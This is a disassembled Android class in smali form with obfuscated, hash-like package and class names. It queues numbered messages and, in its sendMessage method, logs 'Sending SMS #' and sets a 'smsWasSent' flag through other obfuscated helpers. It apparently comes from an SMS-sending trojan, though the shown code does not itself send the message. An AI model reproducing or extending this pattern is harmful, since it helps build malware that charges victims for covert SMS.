.class public Lcom/adc58a797/ac31b3236/a740675ee/a4591429a;
.super Ljava/lang/Object;
.source "aSLTolNdx.java"


# static fields
.field private static s_instance:Lcom/adc58a797/ac31b3236/a740675ee/a4591429a;


# instance fields
.field private pushedMessages:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/4 v0, 0x0

    sput-object v0, Lcom/adc58a797/ac31b3236/a740675ee/a4591429a;->s_instance:Lcom/adc58a797/ac31b3236/a740675ee/a4591429a;

    return-void
.end method

.method private constructor <init>()V
    .locals 1

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a4591429a;->pushedMessages:Ljava/util/ArrayList;

    return-void
.end method

.method public static getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a4591429a;
    .locals 1

    sget-object v0, Lcom/adc58a797/ac31b3236/a740675ee/a4591429a;->s_instance:Lcom/adc58a797/ac31b3236/a740675ee/a4591429a;

    if-nez v0, :cond_0

    new-instance v0, Lcom/adc58a797/ac31b3236/a740675ee/a4591429a;

    invoke-direct {v0}, Lcom/adc58a797/ac31b3236/a740675ee/a4591429a;-><init>()V

    sput-object v0, Lcom/adc58a797/ac31b3236/a740675ee/a4591429a;->s_instance:Lcom/adc58a797/ac31b3236/a740675ee/a4591429a;

    :cond_0
    sget-object v0, Lcom/adc58a797/ac31b3236/a740675ee/a4591429a;->s_instance:Lcom/adc58a797/ac31b3236/a740675ee/a4591429a;

    return-object v0
.end method

.method private sendMessage(Landroid/content/Context;I)V
    .locals 4

    const-string v1, "sendMessage"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Sending SMS #"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-static {p2}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;

    move-result-object v0

    invoke-virtual {v0, p1}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->init(Landroid/content/Context;)V

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;

    move-result-object v1

    const-string v2, "smsWasSent"

    const-string v3, "true"

    invoke-virtual {v1, v2, v3}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->setRuntimeValue(Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method


# virtual methods
.method public pushMessage(I)V
    .locals 2

    iget-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a4591429a;->pushedMessages:Ljava/util/ArrayList;

    invoke-static {p1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    return-void
.end method

.method public sendAvaitingMessages(Landroid/content/Context;)V
    .locals 2

    const/4 v0, 0x0

    :goto_0
    iget-object v1, p0, Lcom/adc58a797/ac31b3236/a740675ee/a4591429a;->pushedMessages:Ljava/util/ArrayList;

    invoke-virtual {v1}, Ljava/util/ArrayList;->size()I

    move-result v1

    if-ge v0, v1, :cond_0

    iget-object v1, p0, Lcom/adc58a797/ac31b3236/a740675ee/a4591429a;->pushedMessages:Ljava/util/ArrayList;

    invoke-virtual {v1, v0}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/Integer;

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v1

    invoke-direct {p0, p1, v1}, Lcom/adc58a797/ac31b3236/a740675ee/a4591429a;->sendMessage(Landroid/content/Context;I)V

    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_0
    return-void
.end method
